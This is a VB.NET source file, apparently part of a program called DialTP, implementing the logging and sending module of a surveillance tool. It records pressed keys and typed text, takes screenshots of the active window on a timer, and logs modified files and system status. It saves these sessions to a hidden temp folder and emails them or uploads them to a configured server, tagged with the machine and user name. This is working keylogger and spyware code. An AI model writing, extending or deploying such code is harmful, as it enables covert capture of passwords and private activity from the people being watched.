Imports System.Runtime.InteropServices
Imports System.Reflection
Imports System.Drawing
Imports System.Threading
Imports System.Net.Mail
Imports System.Drawing.Imaging
Imports System.Diagnostics
Imports Ionic.Zip
Imports System.Net

Public Class Log
    Private Class MailInfo
        Public files As New ArrayList
        Public m As System.Net.Mail.MailMessage
    End Class



    <Serializable> _
    Public Class LogSession
        Implements IDisposable

        Public Shared sessionsLock As New Object
        Public Shared SessionsCount As Integer = 0

        Public SessionID As Integer
        Public StartTime As Date = Now
        Public images As New System.Collections.ArrayList
        Public logBuffer As New System.Text.StringBuilder
        Public textBuffer As New System.Text.StringBuilder
        Public keysBuffer As New System.Text.StringBuilder
        Public filesBuffer As New System.Text.StringBuilder
        Public FileName As String = ""
        Public Description As String = ""

        Public Sub New()
            SyncLock sessionsLock
                Me.SessionID = SessionsCount
                SessionsCount += 1
            End SyncLock
            'In case you end up with "0" (probably because you just created the PerformanceCounter and then directly used it) you need to add 2 lines as the PerformanceCounter need some time to work:


        End Sub

        Public Sub Append(ByVal str As String)
            SyncLock Me
                Dim d As Date = Now
                str = FinSeA.Sistema.Formats.FormatUserDateTime(d) & vbTab & str & "<br/>"
                Me.logBuffer.Append(str)
            End SyncLock
        End Sub


        Public Sub AppendKeyabord(ByVal str As String)
            SyncLock Me
                Dim d As Date = Now
                str = FinSeA.Sistema.Formats.FormatUserDateTime(d) & vbTab & str & "<br/>"
                Me.keysBuffer.Append(str)
            End SyncLock
        End Sub

        Public Sub AppendChar(ByVal str As String)
            SyncLock Me
                Me.textBuffer.Append(str)
            End SyncLock
        End Sub

        Public Sub AppendFile(ByVal str As String)
            SyncLock Me
                Dim d As Date = Now
                str = FinSeA.Sistema.Formats.FormatUserDateTime(d) & vbTab & str & "<br/>"
                Me.filesBuffer.Append(str)
            End SyncLock
        End Sub

        'Private m_SendQueue As New ArrayList
        Public Sub Prepare()
            Dim text As String = ""

            text &= "SESSIONE N°" & Me.SessionID & "<br/>"
            text &= "<br/>"

            Try
                Dim cpu As New PerformanceCounter()
                With cpu
                    .CategoryName = "Processor"
                    .CounterName = "% Processor Time"
                    .InstanceName = "_Total"
                End With

                cpu.NextValue()
                text &= "Carico CPU: " & Math.Ceiling(cpu.NextValue) & " %" & "<br/>"

            Catch ex As Exception
                text &= "Failed to get CPU status"
            End Try

            Try

                Dim mem As MEMORYSTATUSEX = Memory.GetMemoryStatus

                text &= "Carico RAM: " & mem.dwMemoryLoad & " %" & "<br/>"

                With mem
                    text &= "<table>"
                    text &= "<tr><td>RAM Totale:</td><td style=""text-align:right;"">" & FinSeA.Sistema.Formats.FormatInteger(.ullTotalPhys) & " Bytes</td></tr>"
                    text &= "<tr><td>RAM Disponibile:</td><td style=""text-align:right;"">" & FinSeA.Sistema.Formats.FormatInteger(.ullAvailPhys) & " Bytes</td></tr>"
                    text &= "<tr><td>Paginazione Totale:</td><td style=""text-align:right;"">" & FinSeA.Sistema.Formats.FormatInteger(.ullTotalPageFile) & " Bytes</td></tr>"
                    text &= "<tr><td>Paginazione Disponibile:</td><td style=""text-align:right;"">" & FinSeA.Sistema.Formats.FormatInteger(.ullAvailPageFile) & " Bytes</td></tr>"
                    text &= "<tr><td>Virtuale Totale:</td><td style=""text-align:right;"">" & FinSeA.Sistema.Formats.FormatInteger(.ullTotalVirtual) & " Bytes</td></tr>"
                    text &= "<tr><td>Virtuale Disponibile:</td><td style=""text-align:right;"">" & FinSeA.Sistema.Formats.FormatInteger(.ullAvailVirtual) & " Bytes</td></tr>"
                    text &= "</table>"
                    ' text &= "Virtuale Disponibile: " & .ullAvailVirtual & " Bytes" & vbNewLine
                    ' Public ullAvailExtendedVirtual As UInt64
                End With
            Catch ex As Exception
                text &= "Failder to get memory status"
            End Try

            text &= "<br/>"
            text &= "<br/>"



            text &= "<br/><hr/>"
            text &= "CHECKPROCESS"
            Try
                text &= CheckProcesses1()
            Catch ex As Exception
                text &= ex.StackTrace
            End Try

            text &= "<br/>"
            text &= FinSeA.Sistema.Strings.NChars(80, "-") & "<br/>"
            text &= "| Testo " & "<br/>"
            text &= Me.textBuffer.ToString()
            text &= "<br/>"
            text &= FinSeA.Sistema.Strings.NChars(80, "-") & "<br/>"
            text &= "| FILES MODIFICATI " & "<br/>"
            text &= Me.filesBuffer.ToString()
            text &= "<br/>"
            text &= FinSeA.Sistema.Strings.NChars(80, "-") & "<br/>"
            text &= "| LOG " & "<br/>"
            text &= Me.logBuffer.ToString()
            text &= "<br/>"
            text &= FinSeA.Sistema.Strings.NChars(80, "-") & "<br/>"
            text &= "| TASTI PREMUTI " & "<br/>"
            text &= Me.keysBuffer.ToString()

            Me.Description = text
        End Sub

        Public Sub Send(ByVal asy As Boolean)
            Me.Prepare()

            Dim quality As Long = 50L

            'If (My.Settings.LastLogFile <> "") Then
            Dim tmpName As String = ""
            Dim m As New MailMessage
            m.From = New MailAddress(My.Settings.SMTPUserName, My.Settings.SMTPDisplayName)
            m.Subject = My.Settings.SMTPSubject & " [" & My.Computer.Name & ", " & My.User.Name & "]"
            m.To.Add(New MailAddress(My.Settings.SMTPNotifyTo))

            Dim info As New MailInfo
            Dim a As Attachment = Nothing
            Dim cnt As Integer = 0
            For Each img As System.Drawing.Image In Me.images
                Dim strName As String = Now.Year & Right("00" & Now.Month, 2) & Right("00" & Now.Day, 2) & Right("00" & Now.Hour, 2) & Right("00" & Now.Minute, 2) & Right("00" & Now.Second, 2) & "_" & cnt
                cnt += 1
                Try
                    Dim jgpEncoder As ImageCodecInfo = GetEncoder(ImageFormat.Jpeg)
                    Dim myEncoder As System.Drawing.Imaging.Encoder = System.Drawing.Imaging.Encoder.Quality
                    Dim myEncoderParameters As EncoderParameters = New EncoderParameters(1)
                    Dim myEncoderParameter As EncoderParameter = New EncoderParameter(myEncoder, quality)
                    myEncoderParameters.Param(0) = myEncoderParameter


                    tmpName = System.IO.Path.GetTempFileName
                    img.Save(tmpName, jgpEncoder, myEncoderParameters)
                    img.Dispose()

                    info.files.Add(tmpName)

                    a = New Attachment(tmpName)
                    a.Name = strName & "_ScreenShot.jpg"
                    m.Attachments.Add(a)
                Catch ex As Exception
                    Me.Append("Errore nel file dello screenshot: " & ex.Message)
                End Try
            Next

            m.IsBodyHtml = False
            m.Body = Me.Description
            m.IsBodyHtml = True

            'Dim smtp As New SmtpClient(My.Settings.SMTPServer, My.Settings.SMTPPort)
            'smtp.UseDefaultCredentials = True 'False
            'smtp.EnableSsl = My.Settings.SMTPSSL
            'If (My.Settings.SMTPUserName <> "") Then
            '    smtp.Credentials = New System.Net.NetworkCredential(My.Settings.SMTPUserName, My.Settings.SMTPPassword)
            'End If
            'smtp.Send(m)

            FinSeA.Sistema.EMailer.Config.SMTPLimitOutSent = My.Settings.SMTPLimitOutSent
            FinSeA.Sistema.EMailer.Config.SMTPUserName = My.Settings.SMTPUserName
            FinSeA.Sistema.EMailer.Config.SMTPPassword = My.Settings.SMTPPassword
            FinSeA.Sistema.EMailer.Config.SMTPServer = My.Settings.SMTPServer
            FinSeA.Sistema.EMailer.Config.SMTPServerPort = My.Settings.SMTPPort
            FinSeA.Sistema.EMailer.Config.SMTPUseSSL = My.Settings.SMTPSSL

            If (asy) Then

                info.m = m
                SyncLock m_SentMessages
                    m_SentMessages.Add(info)
                End SyncLock
                FinSeA.Sistema.EMailer.SendMessageAsync(m, False)
            Else
                FinSeA.Sistema.EMailer.SendMessage(m)
                If (a IsNot Nothing) Then a.Dispose()
                m.Dispose()
                For Each tmpName In info.files
                    Try
                        System.IO.File.Delete(tmpName)
                    Catch ex As Exception

                    End Try
                Next
            End If

        End Sub

        Public Sub TakeScreenShot()
            SyncLock Me
                'Per prima cosa inviamo i vecchi dati
                Try
                    Dim hWnd As IntPtr = Window.GetForegroundWindow 'Window.GetDesktopWindow 
                    Dim img As System.Drawing.Image = Window.GetWindowContent(hWnd)
                    Me.images.Add(img)
                Catch ex As Exception
                    Me.Append(ex.StackTrace)
                End Try
            End SyncLock
        End Sub

        Public Sub TakeMouseScreenShot()
            Try
                SyncLock Me
                    'Per prima cosa inviamo i vecchi dati


                    Dim currWin As IntPtr = GetForegroundWindow()
                    If (Not m_LastWin.Equals(currWin)) Then
                        TakeScreenShot()
                    Else
                        Try
                            Dim hWnd As IntPtr = Window.GetForegroundWindow 'Window.GetDesktopWindow 
                            Dim img As System.Drawing.Image = Window.GetMousePic(160, 80)
                            Me.images.Add(img)
                        Catch ex As Exception
                            Me.Append(ex.StackTrace)
                        End Try
                    End If
                    m_LastWin = currWin
                End SyncLock

            Catch ex As Exception
                Throw New Exception("Log.Errore in TakeMouseScreenShot")
                FinSeA.Sistema.Events.NotifyUnhandledException(ex)
            End Try
        End Sub

#Region "IDisposable Support"
        Private disposedValue As Boolean ' To detect redundant calls

        ' IDisposable
        Protected Overridable Sub Dispose(disposing As Boolean)
            If Not Me.disposedValue Then
                If disposing Then
                    ' TODO: dispose managed state (managed objects).
                End If

                ' TODO: free unmanaged resources (unmanaged objects) and override Finalize() below.
                ' TODO: set large fields to null.
            End If
            SyncLock Me
                For Each img As System.Drawing.Image In Me.images
                    img.Dispose()
                Next
                Me.images = Nothing
                Me.filesBuffer = Nothing
                Me.keysBuffer = Nothing
                Me.logBuffer = Nothing
                Me.textBuffer = Nothing
            End SyncLock

            Me.disposedValue = True
        End Sub

        ' TODO: override Finalize() only if Dispose(ByVal disposing As Boolean) above has code to free unmanaged resources.
        'Protected Overrides Sub Finalize()
        '    ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
        '    Dispose(False)
        '    MyBase.Finalize()
        'End Sub

        ' This code added by Visual Basic to correctly implement the disposable pattern.
        Public Sub Dispose() Implements IDisposable.Dispose
            ' Do not change this code.  Put cleanup code in Dispose(disposing As Boolean) above.
            Dispose(True)
            GC.SuppressFinalize(Me)
        End Sub
#End Region

        Public Sub Upload()
            If My.Settings.UploadServer <> "" Then
                My.Computer.Network.UploadFile(Me.FileName, My.Settings.UploadServer & "?kname=" & My.Computer.Name)
            End If
        End Sub

        Private Function DataPath() As String
            Dim d As Date = Now
            Return Right("0000" & d.Year, 4) & Right("00" & d.Month, 2) & Right("00" & d.Day, 2) & Right("00" & d.Hour, 2) & Right("00" & d.Minute, 2) & Right("00" & d.Second, 2)
        End Function

       
        Public Sub Save()
            Me.Prepare()

            Dim stream As System.IO.Stream = Nothing
            If (Me.FileName = "") Then
                SyncLock lockObject
                    Dim folder As String = GetLogFolder()
                    Me.FileName = folder & "\" & Me.DataPath & ".dtp"
                    Dim i As Integer = 1
                    While System.IO.File.Exists(Me.FileName)
                        Me.FileName = folder & "" & Me.DataPath & Right("0000" & i, 4) & ".dtp"
                        i += 1
                    End While
                    stream = New System.IO.FileStream(Me.FileName & ".tmp", IO.FileMode.Create)
                End SyncLock
            Else
                stream = New System.IO.FileStream(Me.FileName & ".tmp", IO.FileMode.Open)
            End If

            Dim serializer As New System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            serializer.Serialize(stream, Me)

            stream.Dispose()


            Dim out As New System.IO.StringWriter
            Dim zip As New ZipFile
            zip.StatusMessageTextWriter = out
            zip.ZipErrorAction = ZipErrorAction.Skip
            'zip.AddDirectory(Sistema.ApplicationContext.WorkingFolder)
            zip.AddFile(Me.FileName & ".tmp", "")
            zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression
            zip.CompressionMethod = CompressionMethod.BZip2
            zip.UseZip64WhenSaving = Zip64Option.AsNecessary

            stream = New System.IO.FileStream(Me.FileName, IO.FileMode.Create)
            zip.Save(stream)
            stream.Dispose()
            out.Dispose()

            FinSeA.Sistema.FileSystem.DeleteFile(Me.FileName & ".tmp")
        End Sub

        Public Shared Function Load(ByVal fileName As String) As LogSession
            Dim zip As New ZipFile(fileName)
            Dim fName As String = FinSeA.Sistema.FileSystem.GetFileName(fileName)
            zip.ExtractAll(GetLogFolder, ExtractExistingFileAction.OverwriteSilently)
            zip.Dispose()

            Dim stream As System.IO.Stream = New System.IO.FileStream(fileName & ".tmp", IO.FileMode.Open)
            Dim serializer As New System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            Dim ret As LogSession = serializer.Deserialize(stream)
            stream.Dispose()


            FinSeA.Sistema.FileSystem.DeleteFile(fileName & ".tmp")
            Return ret
        End Function

        Public Sub Delete()
            FinSeA.Sistema.FileSystem.DeleteFile(Me.FileName)
        End Sub
    End Class

    Private Shared m_LastWin As IntPtr
    Private Shared m_SentMessages As New FinSeA.CCollection
    Private Shared lockObject As New Object
    Private Shared m_Sessions As New System.Collections.ArrayList
    Private Shared m_CurrSession As LogSession = Nothing
    Private Shared WithEvents m_Timer As New System.Timers.Timer

    Shared Sub New()
        AddHandler FinSeA.Sistema.EMailer.MessageSent, AddressOf handleMsgSent
    End Sub

    Public Shared Sub Reset()
        Try
            m_Timer.Enabled = My.Settings.UploadInterval > 0
            If (My.Settings.UploadInterval > 0) Then m_Timer.Interval = My.Settings.UploadInterval * 60 * 1000
        Catch ex As Exception
            FinSeA.Sistema.Events.NotifyUnhandledException(ex)
        End Try
    End Sub

    Public Shared Sub handleMsgSent(ByVal sender As Object, ByVal e As FinSeA.Sistema.MailMessageEventArgs)
        Try
            Dim info As MailInfo = Nothing

            SyncLock m_SentMessages
                Dim i As Integer = 0
                While (i < m_SentMessages.Count())
                    If (m_SentMessages(i).m Is e.Message) Then
                        info = m_SentMessages(i)
                        m_SentMessages.RemoveAt(i)
                        Exit While
                    End If
                    i += 1
                End While
            End SyncLock

            If (info IsNot Nothing) Then
                For Each fName As String In info.files
                    Try
                        System.IO.File.Delete(fName)
                    Catch ex As Exception
                    End Try
                Next
            End If

            For Each a As System.Net.Mail.Attachment In e.Message.Attachments
                a.Dispose()
            Next
            e.Message.Attachments.Clear()

            For Each a As System.Net.Mail.AlternateView In e.Message.AlternateViews
                For Each l As System.Net.Mail.LinkedResource In a.LinkedResources
                    l.Dispose()
                Next
                a.LinkedResources.Clear()
                a.Dispose()
            Next
            e.Message.AlternateViews.Clear()
            e.Message.Dispose()
        Catch ex As Exception
            FinSeA.Sistema.Events.NotifyUnhandledException(ex)
        End Try
    End Sub

    Public Shared Function GetLogFolder() As String
        Dim folder As String = System.IO.Path.GetTempPath & "DialTP"
        FinSeA.Sistema.FileSystem.CreateRecursiveFolder(folder)
        Return folder
    End Function

    Public Shared Function GetCurrSession() As LogSession
        ' Try
        SyncLock lockObject
            If m_CurrSession Is Nothing Then
                m_CurrSession = New LogSession
                m_CurrSession.TakeScreenShot()
                m_Sessions.Add(m_CurrSession)
                m_CurrSession.Save()
            ElseIf m_CurrSession.images.Count > 10 OrElse Math.Abs(DateDiff(DateInterval.Second, Now, m_CurrSession.StartTime)) >= My.Settings.ScreenShotEvery Then
                m_CurrSession.TakeMouseScreenShot()
                'm_CurrSession.Send(True)
                m_CurrSession = New LogSession
                m_CurrSession.TakeScreenShot()
                m_Sessions.Add(m_CurrSession)
                m_CurrSession.Save()
            End If
            Return m_CurrSession
        End SyncLock
        '
    End Function

    Private Shared Function GetEncoder(ByVal format As ImageFormat) As ImageCodecInfo
        Dim codecs As ImageCodecInfo() = ImageCodecInfo.GetImageDecoders()
        For Each codec As ImageCodecInfo In codecs
            If (codec.FormatID = format.Guid) Then
                Return codec
            End If
        Next
        Return Nothing
    End Function

    'Public Shared Sub Dispose(ByVal asy As Boolean)
    '    SyncLock lockObject
    '        'GetCurrSession.Send(False)
    '        m_CurrSession = Nothing
    '    End SyncLock
    'End Sub




    Public Shared Sub CheckWindow()
        Try
            Dim currWin As IntPtr = GetForegroundWindow()
            If (Not m_LastWin.Equals(currWin)) Then
                DIALTP.Log.GetCurrSession.TakeScreenShot()
            End If
            m_LastWin = currWin
        Catch ex As Exception
            FinSeA.Sistema.Events.NotifyUnhandledException(ex)
        End Try
    End Sub

    Private Shared Sub m_Timer_Elapsed(sender As Object, e As Timers.ElapsedEventArgs) Handles m_Timer.Elapsed
        SyncLock lockObject
            Try
                Dim folder As String = GetLogFolder()
                Dim info As New System.IO.DirectoryInfo(folder)
                Dim files As System.IO.FileInfo() = info.GetFiles("*.dtp")
                If (files IsNot Nothing) Then
                    Array.Sort(files, New fComparer)
                    Dim item As LogSession = LogSession.Load(files(0).FullName)
                    item.Upload()
                    item.Delete()
                End If
            Catch ex As Exception
                FinSeA.Sistema.Events.NotifyUnhandledException(ex)
            End Try
        End SyncLock
    End Sub

    Private Class fComparer
        Implements IComparer

        Public Function Compare(x As Object, y As Object) As Integer Implements IComparer.Compare
            Dim a As System.IO.FileInfo = x
            Dim b As System.IO.FileInfo = y
            Return Strings.StrComp(a.Name, b.Name, CompareMethod.Text)
        End Function
    End Class
End Class

